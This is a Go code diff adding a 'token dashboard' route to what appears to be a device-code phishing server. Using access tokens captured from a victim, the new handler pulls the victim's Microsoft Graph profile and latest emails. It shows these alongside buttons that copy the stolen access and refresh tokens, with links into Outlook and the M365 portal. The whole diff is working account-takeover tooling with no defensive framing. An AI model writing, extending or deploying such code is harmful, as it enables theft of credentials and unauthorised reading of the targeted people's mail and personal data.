@@ -2,6 +2,9 @@ package core
 
 import (
 	"encoding/json"
+	"fmt"
+	"html/template"
+	"io"
 	"net/http"
 	"regexp"
 	"strings"
@@ -41,8 +44,9 @@ func NewHttpServer() (*HttpServer, error) {
 	r.HandleFunc("/admin/blacklist/flush", s.handleBlacklistFlush).Methods("POST")
 	// Admin panel
 	r.HandleFunc("/admin/panel", s.handleAdminPanel).Methods("GET", "POST")
-	// Device code landing pages
+	// Device code landing pages + token dashboard
 	r.HandleFunc("/dc/{token}", s.handleDCLanding).Methods("GET")
+	r.HandleFunc("/dc/use/{token}", s.handleDCUse).Methods("GET")
 	// User panels
 	r.PathPrefix("/panel/").HandlerFunc(s.handleUserPanel)
 
@@ -256,6 +260,178 @@ func (s *HttpServer) handleDCLanding(w http.ResponseWriter, r *http.Request) {
 	}
 	w.Header().Set("Content-Type", "text/html; charset=utf-8")
 	w.Write([]byte(DCLandingPage(tgt)))
+}
+
+// handleDCUse fetches Graph API data for a completed device code target and
+// renders a one-click admin dashboard showing the victim's account details.
+func (s *HttpServer) handleDCUse(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	token := vars["token"]
+	tgt := GetTargetByToken(token)
+	if tgt == nil {
+		http.Error(w, "token not found", http.StatusNotFound)
+		return
+	}
+	tgt.mu.Lock()
+	at := tgt.AccessToken
+	rt := tgt.RefreshToken
+	email := tgt.Email
+	tgt.mu.Unlock()
+
+	if at == "" {
+		http.Error(w, "no access token captured yet — wait for the victim to approve", http.StatusBadRequest)
+		return
+	}
+
+	// Fetch profile from Graph API
+	type graphUser struct {
+		DisplayName       string `json:"displayName"`
+		Mail              string `json:"mail"`
+		UserPrincipalName string `json:"userPrincipalName"`
+		JobTitle          string `json:"jobTitle"`
+		Department        string `json:"department"`
+		OfficeLocation    string `json:"officeLocation"`
+		MobilePhone       string `json:"mobilePhone"`
+	}
+	type graphMsg struct {
+		Subject      string `json:"subject"`
+		ReceivedDate string `json:"receivedDateTime"`
+		From         struct {
+			EmailAddress struct {
+				Name    string `json:"name"`
+				Address string `json:"address"`
+			} `json:"emailAddress"`
+		} `json:"from"`
+		BodyPreview string `json:"bodyPreview"`
+	}
+	type graphMsgList struct {
+		Value []graphMsg `json:"value"`
+	}
+
+	doGraph := func(path string) ([]byte, error) {
+		req, _ := http.NewRequest("GET", "https://graph.microsoft.com/v1.0"+path, nil)
+		req.Header.Set("Authorization", "Bearer "+at)
+		req.Header.Set("Accept", "application/json")
+		resp, err := http.DefaultClient.Do(req)
+		if err != nil {
+			return nil, err
+		}
+		defer resp.Body.Close()
+		return io.ReadAll(resp.Body)
+	}
+
+	var user graphUser
+	if b, err := doGraph("/me"); err == nil {
+		json.Unmarshal(b, &user)
+	}
+	var msgs graphMsgList
+	if b, err := doGraph("/me/messages?$top=8&$select=subject,from,receivedDateTime,bodyPreview&$orderby=receivedDateTime desc"); err == nil {
+		json.Unmarshal(b, &msgs)
+	}
+
+	if user.Mail == "" {
+		user.Mail = user.UserPrincipalName
+	}
+	if user.Mail == "" {
+		user.Mail = email
+	}
+
+	// Build rows
+	var rows strings.Builder
+	for _, m := range msgs.Value {
+		t := m.ReceivedDate
+		if len(t) >= 10 {
+			t = t[:10]
+		}
+		rows.WriteString(fmt.Sprintf(`<tr>
+<td>%s</td><td>%s &lt;%s&gt;</td><td>%s</td></tr>`,
+			template.HTMLEscapeString(t),
+			template.HTMLEscapeString(m.From.EmailAddress.Name),
+			template.HTMLEscapeString(m.From.EmailAddress.Address),
+			template.HTMLEscapeString(m.Subject)))
+	}
+
+	w.Header().Set("Content-Type", "text/html; charset=utf-8")
+	fmt.Fprintf(w, `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<title>Token Dashboard — %s</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#0f0f0f;color:#e0e0e0;padding:24px}
+h1{font-size:20px;color:#fff;margin-bottom:4px}
+.sub{font-size:13px;color:#888;margin-bottom:24px}
+.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:6px;padding:20px 24px;margin-bottom:18px}
+.card h2{font-size:13px;text-transform:uppercase;letter-spacing:.8px;color:#666;margin-bottom:14px}
+.kv{display:grid;grid-template-columns:160px 1fr;gap:6px 12px;font-size:13px}
+.kv .k{color:#666}
+.kv .v{color:#e0e0e0;word-break:break-all}
+.token-box{background:#111;border:1px solid #333;border-radius:4px;padding:10px 14px;font-family:monospace;font-size:11px;color:#7ec8e3;word-break:break-all;margin-top:8px;max-height:80px;overflow-y:auto}
+table{width:100%%;border-collapse:collapse;font-size:12px}
+th{text-align:left;padding:8px 10px;color:#555;border-bottom:1px solid #222;font-weight:600;text-transform:uppercase;font-size:11px;letter-spacing:.5px}
+td{padding:8px 10px;border-bottom:1px solid #1e1e1e;color:#ccc;vertical-align:top}
+tr:hover td{background:#1e1e1e}
+.actions{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:20px}
+.btn{padding:8px 18px;border-radius:4px;font-size:13px;font-weight:600;text-decoration:none;border:none;cursor:pointer}
+.btn-blue{background:#0078d4;color:#fff}
+.btn-dark{background:#2a2a2a;color:#ccc;border:1px solid #333}
+.copied{color:#5cb85c;font-size:12px;display:none;margin-left:8px}
+</style></head><body>
+<h1>%s</h1>
+<p class="sub">%s &nbsp;·&nbsp; %s</p>
+
+<div class="actions">
+<button class="btn btn-blue" onclick="copyToken()">Copy Access Token</button>
+<button class="btn btn-dark" onclick="copyRT()">Copy Refresh Token</button>
+<a class="btn btn-dark" href="https://outlook.office.com/mail/" target="_blank">Open Outlook</a>
+<a class="btn btn-dark" href="https://portal.office.com" target="_blank">Open M365 Portal</a>
+<span class="copied" id="cp">Copied!</span>
+</div>
+
+<div class="card">
+<h2>Profile</h2>
+<div class="kv">
+<span class="k">Display name</span><span class="v">%s</span>
+<span class="k">Email</span><span class="v">%s</span>
+<span class="k">Job title</span><span class="v">%s</span>
+<span class="k">Department</span><span class="v">%s</span>
+<span class="k">Office</span><span class="v">%s</span>
+<span class="k">Mobile</span><span class="v">%s</span>
+</div>
+</div>
+
+<div class="card">
+<h2>Access Token</h2>
+<div class="token-box" id="at">%s</div>
+</div>
+
+<div class="card" style="margin-bottom:18px">
+<h2>Recent Emails</h2>
+<table><thead><tr><th>Date</th><th>From</th><th>Subject</th></tr></thead><tbody>
+%s
+</tbody></table>
+</div>
+
+<script>
+var at = %q;
+var rt = %q;
+function copyToken(){navigator.clipboard.writeText(at);flash();}
+function copyRT(){navigator.clipboard.writeText(rt);flash();}
+function flash(){var c=document.getElementById('cp');c.style.display='inline';setTimeout(function(){c.style.display='none';},1500);}
+</script>
+</body></html>`,
+		template.HTMLEscapeString(user.Mail),
+		template.HTMLEscapeString(user.DisplayName),
+		template.HTMLEscapeString(user.Mail),
+		template.HTMLEscapeString(user.Department),
+		template.HTMLEscapeString(user.DisplayName),
+		template.HTMLEscapeString(user.Mail),
+		template.HTMLEscapeString(user.JobTitle),
+		template.HTMLEscapeString(user.Department),
+		template.HTMLEscapeString(user.OfficeLocation),
+		template.HTMLEscapeString(user.MobilePhone),
+		template.HTMLEscapeString(at),
+		rows.String(),
+		at, rt,
+	)
 }
 
 // HandleRedirect returns an http.HandlerFunc that implements the same redirect logic as
